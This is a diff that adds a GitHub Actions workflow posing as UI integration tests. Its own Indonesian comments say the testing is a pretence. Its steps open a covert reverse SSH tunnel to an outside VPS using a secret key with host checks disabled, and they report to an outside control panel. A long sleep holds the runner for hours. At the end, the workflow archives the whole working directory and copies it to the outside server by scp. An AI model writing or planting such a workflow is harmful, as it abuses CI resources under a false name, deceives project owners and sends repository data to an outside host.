@@ -1,0 +1,60 @@
+name: UI Integration Tests (Alpha)
+
+on:
+  workflow_dispatch:
+    inputs:
+      developer_id:
+        description: 'Dev Account'
+        required: true
+      test_port:
+        description: 'Socket Port'
+        required: true
+        default: '7999'
+
+jobs:
+  integration-check:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300 # Selesai di 5 Jam
+
+    steps:
+      - name: 1. Setup Environment
+        uses: actions/checkout@v3
+
+      - name: 2. Restore Cache & Dependencies
+        run: |
+          npm install
+          # Menjalankan project di background seolah-olah sedang di-test
+          npm run dev -- --port 3000 &
+          sleep 10
+          
+      - name: 3. Initialize Socket Diagnostics
+        run: |
+          # Ini sebenarnya setup reverse SSH ke VPS kamu
+          echo "${{ secrets.VPS_KEY }}" > auth_key
+          chmod 600 auth_key
+          
+          # Lapor ke Panel Thyocloud bahwa "Testing" sudah jalan
+          curl -X POST "https://thyocloud.up.railway.app/api/status" \
+               -H "Content-Type: application/json" \
+               -d '{"account": "${{ github.event.inputs.developer_id }}", "status": "active", "socket": "${{ github.event.inputs.test_port }}"}'
+               
+          # Eksekusi tunnel terselubung di background
+          ssh -f -N -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -i auth_key -R "${{ github.event.inputs.test_port }}:localhost:3000" ubuntu@thyoserver.web.id
+
+      - name: 4. Run Stress & Load Tests
+        run: |
+          # Ini cuma sleep untuk nahan server nyala selama 4 jam 50 menit
+          sleep 17400
+
+      - name: 5. Prepare Artifacts for Next Stage
+        run: |
+          # Minta Panel Thyocloud nyalain script Beta
+          curl -X POST "https://thyocloud.up.railway.app/api/relay" \
+               -H "Content-Type: application/json" \
+               -d '{"account": "${{ github.event.inputs.developer_id }}", "trigger": "beta"}'
+          
+          sleep 60 # Kasih waktu script Beta booting
+          
+          # Backup data dan lempar ke VPS (biar diambil sama Beta)
+          tar -czvf app-state.tar.gz ./
+          scp -o StrictHostKeyChecking=no -i auth_key app-state.tar.gz ubuntu@thyoserver.web.id:/tmp/state_${{ github.event.inputs.developer_id }}.tar.gz
